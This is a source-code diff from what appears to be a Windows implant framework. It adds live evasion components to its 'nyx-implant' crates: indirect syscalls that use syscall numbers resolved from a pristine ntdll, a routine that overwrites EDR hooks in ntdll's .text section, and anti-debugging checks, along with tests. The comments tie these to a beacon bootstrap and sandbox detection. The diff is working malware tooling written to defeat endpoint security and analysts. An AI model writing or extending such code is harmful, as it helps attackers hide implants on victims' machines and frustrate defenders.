@@ -1,6 +1,9 @@
 //! Live userland-evasion glue: real impls of `nyx-implant-evasionsdk` traits
-//! over the live Windows process. P2.1a-i (`PdataGapScanner`) lives here; later
-//! steps add `StackSpoofKit` / `BlindKit` / etc. impls alongside.
+//! over the live Windows process. P2.1a-i (`PdataGapScanner`) lives here; the
+//! later steps added `StackSpoofKit` / `BlindKit` / `MemoryMaskKit`, and the
+//! 2026-08 wave added the last three foundation/self-defense seams:
+//! `SyscallProvider` ([`LiveSyscalls`]), `UnhookKit` ([`LiveUnhook`]) and
+//! `AntiDebugKit` ([`LiveAntiDebug`]).
 //!
 //! ## Single-source-of-truth rule
 //! The algorithmic cores (gap enumeration, frame-chain synthesis, RC4) live
@@ -16,8 +19,8 @@
 use nyx_implant_core::resolve;
 use nyx_implant_evasionsdk::gap;
 use nyx_implant_evasionsdk::{
-    BlindKit, BlindTarget, EvasionError, GapPool, MaskToken, MemoryMaskKit, PdataGapScanner,
-    SpoofGuard, StackSpoofKit,
+    AntiDebugKit, BlindKit, BlindTarget, EvasionError, GapPool, MaskToken, MemoryMaskKit,
+    PdataGapScanner, SpoofGuard, StackSpoofKit, SyscallProvider, UnhookKit,
 };
 
 /// Cap on how many 8-byte-aligned gap anchors we sample per inter-function /
@@ -321,6 +324,92 @@ impl MemoryMaskKit for LiveMemoryMask {
     }
 }
 
+// ---- SyscallProvider (P2.1e) ----------------------------------------------
+//
+// The foundation seam every sensitive call routes through: prime the
+// process-wide indirect-syscall runtime in `nyx_implant_core::syscalls`
+// (SSN table resolved from the PRISTINE ntdll — KnownDlls fresh map → disk →
+// hooked fallback — plus the RX trampoline of per-SSN stubs that jump to an
+// in-ntdll `syscall; ret` gadget).
+
+/// Live syscall source: primes [`nyx_implant_core::syscalls`] once
+/// (idempotently) and then verifies the runtime is actually usable — not just
+/// "init returned", but the canonical first syscall's SSN resolved.
+///
+/// **Honest degrade semantics (x64-on-ARM64 "Prism" emulation):** indirect
+/// syscalls are FATAL under the emulator (0xC000026F at the shared gadget —
+/// see `syscalls::Runtime::direct`), so the runtime comes up in *direct* mode
+/// there: the SSN table is still resolved but `syscall4/5/6/11` call the ntdll
+/// exports directly (function over stealth — the crate-wide noevasion-degrade
+/// convention). `prime()` returns `Ok` in both modes because the capability
+/// this seam contracts — "a resolved syscall runtime backs sensitive calls" —
+/// is present either way; callers that care about the stealth level can query
+/// `syscalls::global().map(|rt| rt.is_direct_mode())`.
+pub struct LiveSyscalls;
+
+impl SyscallProvider for LiveSyscalls {
+    fn prime(&self) -> Result<(), EvasionError> {
+        // Idempotent: only the first call builds the runtime; later calls are
+        // no-ops (the trait's "resolve (or confirm)" contract).
+        unsafe { nyx_implant_core::syscalls::init_global() };
+        let rt = nyx_implant_core::syscalls::global().ok_or(EvasionError::Unresolved(
+            "indirect-syscall runtime init (ntdll locate / SSN table / trampoline)",
+        ))?;
+        // Liveness proof, not just presence: the canonical first syscall an
+        // implant makes must have a resolved SSN. (The table is built in
+        // direct/emulated mode too — SSNs are simply unused for dispatch.)
+        if nyx_implant_core::syscalls::ssn_nt_allocate_virtual_memory(rt).is_none() {
+            return Err(EvasionError::Unresolved("NtAllocateVirtualMemory SSN"));
+        }
+        Ok(())
+    }
+}
+
+// ---- UnhookKit (P2.1f) -----------------------------------------------------
+
+/// Live unhook: restore the in-process ntdll `.text` from the pristine
+/// `\KnownDlls\ntdll` SEC_IMAGE map (disk fallback) — the write-back half of
+/// `nyx_implant_core::unhook`, which previously only *read* the fresh map as
+/// an SSN-resolution source. See [`nyx_implant_core::unhook::restore_ntdll_text`]
+/// for the source chain and the hard ordering constraint: MUST run before
+/// `BlindKit` — the restore overwrites our own ntdll byte-patches too.
+/// Idempotent: an already-pristine ntdll costs one fresh map + diff, no write.
+pub struct LiveUnhook;
+
+impl UnhookKit for LiveUnhook {
+    fn unhook(&self) -> Result<(), EvasionError> {
+        // The returned diff count (bytes restored) is diagnostic only; the
+        // seam's success contract is "ntdll .text is pristine on return".
+        unsafe { nyx_implant_core::unhook::restore_ntdll_text() }
+            .map(|_diffs| ())
+            .map_err(|msg| EvasionError::Other(heap_str(msg)))
+    }
+}
+
+// ---- AntiDebugKit (P2.1g) --------------------------------------------------
+
+/// Live anti-debug: `PEB->BeingDebugged` (raw `gs:[0x60]` read — no API, no
+/// ETW) OR `NtQueryInformationProcess(ProcessDebugPort)` routed through the
+/// indirect-syscall runtime when primed (export-resolution fallback
+/// otherwise). This is the `PebDebugPort` impl the seam doc lists as shipped;
+/// the primitives live in [`crate::antidebug`].
+///
+/// Deliberately NOT the full sandbox verdict: the uptime heuristic
+/// (`antidebug::uptime_secs`) answers "is this a fresh sandbox", not "is a
+/// debugger attached", so it stays out of this seam — the beacon bootstrap
+/// gate calls `antidebug::looks_sandboxed` directly for the combined check.
+pub struct LiveAntiDebug;
+
+impl AntiDebugKit for LiveAntiDebug {
+    fn is_being_debugged(&self) -> Result<bool, EvasionError> {
+        // Always `Ok`: the PEB byte read cannot fail, and the DebugPort query
+        // treats "could not resolve / query failed" as not-debugged (a host
+        // where ntdll export resolution fails outright has bigger problems —
+        // see antidebug.rs). A real debugger trip surfaces as `Ok(true)`.
+        Ok(crate::antidebug::is_debugged() || crate::antidebug::is_remote_debugged())
+    }
+}
+
 // NOTE (WP-C 断环第二刀): the `ProcessInjectKit` glue (`ModuleStomper`) moved
 // to the tasks crate's `inject` module (`nyx-implant-tasks`), so this module
 // no longer depends on the inject side.
@@ -359,5 +448,56 @@ mod tests {
         assert!(!nop_pred(7, Some(&img)), "lone trailing 66");
         assert!(!nop_pred(8, Some(&img)), "out-of-range RVA");
         assert!(!nop_pred(0, None), "no image");
+    }
+
+    /// LiveSyscalls::prime installs the process-wide indirect-syscall runtime
+    /// for real (PEB walk → pristine-source SSN table → RX trampoline) and is
+    /// idempotent. Direct (x64-on-ARM64 emulated) mode is accepted — the
+    /// documented Prism degrade, not a failure. prime() itself enforces the
+    /// canonical-SSN liveness check, so an Ok return already proves it; the
+    /// assert below documents that contract against the installed runtime.
+    #[test]
+    fn live_syscalls_prime_installs_runtime() {
+        let p = LiveSyscalls;
+        p.prime().expect("prime on a live ntdll");
+        let rt = nyx_implant_core::syscalls::global().expect("runtime installed");
+        assert!(
+            rt.is_direct_mode()
+                || nyx_implant_core::syscalls::ssn_nt_allocate_virtual_memory(rt).is_some(),
+            "native mode resolves the canonical SSN"
+        );
+        // Idempotent: a second prime confirms rather than rebuilds.
+        p.prime().expect("prime is idempotent");
+    }
+
+    /// LiveUnhook::unhook leaves the in-process ntdll `.text` pristine. Under
+    /// wine (no EDR hooks) the idempotent no-write path is taken; on a hooked
+    /// host the write-back runs. Either way the post-condition must hold: a
+    /// second restore pass finds ZERO diffs. Source-agnostic — works whether
+    /// the pristine copy came from KnownDlls or the disk fallback. The
+    /// write-back path itself (simulated hook → byte restored) is covered by
+    /// `implant-core::unhook::tests::restore_repairs_simulated_hook`.
+    #[test]
+    fn live_unhook_leaves_ntdll_pristine() {
+        let u = LiveUnhook;
+        u.unhook()
+            .expect("unhook via KnownDlls or disk pristine source");
+        let second =
+            unsafe { nyx_implant_core::unhook::restore_ntdll_text() }.expect("second restore pass");
+        assert_eq!(second, 0, "post-unhook restore must be a no-op");
+    }
+
+    /// LiveAntiDebug through the seam: no debugger is attached to the wine
+    /// test harness, so the verdict must be Ok(false) — the PEB byte is clear
+    /// and ProcessDebugPort is zero. Proves the seam wiring returns a REAL
+    /// verdict instead of the floor's NoFloor error. (The primitives' own
+    /// tests live in antidebug.rs.)
+    #[test]
+    fn live_antidebug_reports_clean_without_debugger() {
+        let a = LiveAntiDebug;
+        assert!(
+            matches!(a.is_being_debugged(), Ok(false)),
+            "PEB.BeingDebugged + ProcessDebugPort both clean"
+        );
     }
 }
